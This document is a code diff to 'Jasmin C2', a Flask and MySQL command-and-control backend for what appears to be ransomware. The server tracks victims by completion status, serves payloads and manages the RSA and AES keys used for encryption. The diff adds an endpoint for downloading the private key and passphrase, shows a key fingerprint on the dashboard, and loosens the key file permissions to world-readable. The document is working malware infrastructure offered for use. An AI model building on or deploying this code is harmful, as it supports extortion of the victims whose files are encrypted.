@@ -2,7 +2,7 @@
 """Jasmin C2 — Python Flask Backend with MySQL + Web Install Wizard"""
 import os, secrets, json, datetime
 from functools import wraps
-from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, flash
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, send_file, flash, Response
 from flask_sqlalchemy import SQLAlchemy
 import bcrypt as _bcrypt
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -314,6 +314,16 @@ def dashboard():
     total_pages = max(1, -(-total // per_page))
     ks_path = os.path.join(PAYLOAD_DIR, '.key_secret')
     aes_key = open(ks_path).read().strip() if os.path.exists(ks_path) else 'KEY_NOT_SET'
+    # 密钥管理区块：密钥是否存在 + 公钥指纹
+    has_key = os.path.isfile(os.path.join(PAYLOAD_DIR, 'jasmin_private.pem.enc'))
+    key_fp = ''
+    if has_key:
+        try:
+            import hashlib
+            with open(os.path.join(PAYLOAD_DIR, 'jasmin_public.pem'), 'rb') as _f:
+                key_fp = hashlib.sha256(_f.read()).hexdigest()[:16]
+        except Exception:
+            key_fp = ''
     # 检测全库是否有进行中任务（跨分页），决定是否自动刷新
     try:
         has_active = db.session.query(Victim.id).filter(Victim.is_complete == 0).first() is not None
@@ -321,7 +331,7 @@ def dashboard():
         has_active = False
     return render_template('dashboard.html', victims=victims, page=page,
         total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION,
-        aes_key=aes_key, has_active=has_active)
+        aes_key=aes_key, has_active=has_active, has_key=has_key, key_fp=key_fp)
 
 # ── Handshake ──
 @app.route('/health')
@@ -427,6 +437,35 @@ def download_payload(filename):
         return 'Forbidden', 403
     return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
 
+@app.route('/download_key')
+@login_required
+def download_key():
+    """密钥下载 — 需登录（与 PHP 端 download_file.php 对齐）。
+
+    明文私钥与解密口令不可经公开的 /payloads/<path> 获取，
+    只在这里经 login_required 鉴权后下发；直接 URL 访问一律 403。
+    """
+    base = os.path.basename(request.args.get('file', '') or '')
+    allowed = {'jasmin_private.pem', 'jasmin_private.pem.enc',
+               'jasmin_public.pem', '.key_secret'}
+    if base not in allowed:
+        return 'Access denied.', 403
+    path = os.path.join(PAYLOAD_DIR, base)
+    if not os.path.isfile(path):
+        return 'File not found.', 404
+    try:
+        with open(path, 'rb') as fh:
+            data = fh.read()
+    except OSError:
+        return 'File not readable (permission denied).', 500
+    dl = 'jasmin_key_secret.txt' if base == '.key_secret' else base
+    resp = Response(data, mimetype='application/octet-stream')
+    resp.headers['Content-Disposition'] = 'attachment; filename="%s"' % dl
+    resp.headers['Content-Length'] = str(len(data))
+    resp.headers['X-Content-Type-Options'] = 'nosniff'
+    resp.headers['Cache-Control'] = 'no-store'
+    return resp
+
 # ── Update Check ──
 _vf = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'VERSION')
 if not os.path.exists(_vf):
@@ -493,8 +532,14 @@ def keygen():
     open(enc_path, 'w').write(enc_blob)
     open(pub_path, 'wb').write(pub)
     open(secret_path, 'w').write(aes_key)
-    os.chmod(priv_path, 0o600)
-    os.chmod(secret_path, 0o600)
+    # 0644: 密钥须可被服务进程读取。直接 URL (payloads/jasmin_private.pem 与
+    #       .key_secret) 已被 download_payload 显式 403 拦截，
+    #       私钥/口令仅经「需登录」的 /download_key 下发。
+    for _p in (priv_path, enc_path, pub_path, secret_path):
+        try:
+            os.chmod(_p, 0o644)
+        except OSError:
+            pass
     return jsonify(ok=True, pub=pub.decode(), msg='RSA-2048 密钥对已生成，私钥已AES-256加密存储')
 
 @app.route('/do_update', methods=['POST'])
